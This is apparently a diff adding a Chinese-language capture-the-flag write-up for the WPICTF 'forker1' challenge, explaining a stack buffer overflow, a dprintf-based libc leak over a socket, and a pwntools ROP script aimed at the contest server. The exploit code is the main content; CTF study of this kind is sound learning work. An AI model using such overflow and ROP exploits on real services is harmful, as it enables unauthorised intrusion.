@@ -154,3 +154,68 @@ Password:INTERNET_FUNNY_MUNNY
 You got the password right!
 My litecoin address is LNpECGn9in6BGC8eaK87QawjzAXaWMht2b
 ```
+
+雖然他沒開 ASLR ，但我們不知道他的 libc.so (沒給)，所以還是需要先 leak
+
+來算出他的 libc.so 版本，之後再 overflow 控 rip 來 get shell
+
+唯一需要注意的是，我們在overflow 時，當蓋到 buf[77]會影響到 index
+
+所以用 p64(0x4d) 把她設對，位置可以看  ida pro 上
+
+```
+__int64 __fastcall check_password(int input)
+{
+  int tmp_index; // eax@2
+  char tmp; // [sp+1Fh] [bp-51h]@1
+  char buf_1[76]; // [sp+20h] [bp-50h]@2
+  int index; // [sp+6Ch] [bp-4h]@1
+```
+
+
+然後利用 dprintf() 來 leak information ，dprintf() 使用方式是
+
+dprintf(fd, format) ，這題是 socket ，fd = 4 = accept ，所以可以用
+
+dprintf(4, puts@got ) 這樣來 leak 
+
+
+可以先這樣leak 兩個function 然後利用[網站](https://libc.blukat.me/?q=read%3A010%2Cputs%3A460&l=libc6_2.26-0ubuntu3_amd64)來找他的 libc
+
+```python
+#!/usr/bin/env python
+from pwn import *
+context.arch = 'amd64'
+#r = remote('127.0.0.1', 31337)
+r = remote('forker1.wpictf.xyz', 31337)
+print "pid: ",proc.pidof(r)
+
+password = "INTERNET_FUNNY_MUNNY"
+pop_rdi = 0x0000000000400c13
+pop_rsi_r15 = 0x0000000000400c11
+puts_got = 0x0602020
+read_got = 0x602050
+dprintf_plt = 0x400800
+raw_input("#")
+
+trash = "a"*76+p64(0x4d)+"a"*4 
+pad1 = flat([pop_rdi, 4, pop_rsi_r15, read_got, 0, dprintf_plt])
+
+r.sendline(trash + pad1)
+r.recvuntil("Password:")
+addr = u64(r.recv(8).ljust(8, '\x00'))
+print "addr: ",hex(addr)
+r.interactive()
+```
+
+
+得到 libc 就可以去 get shell 了，只是自己沒學過 dup2 ...
+
+solve.py 寫得很醜
+
+[參考](https://ctftime.org/task/5877)
+
+
+
+
+
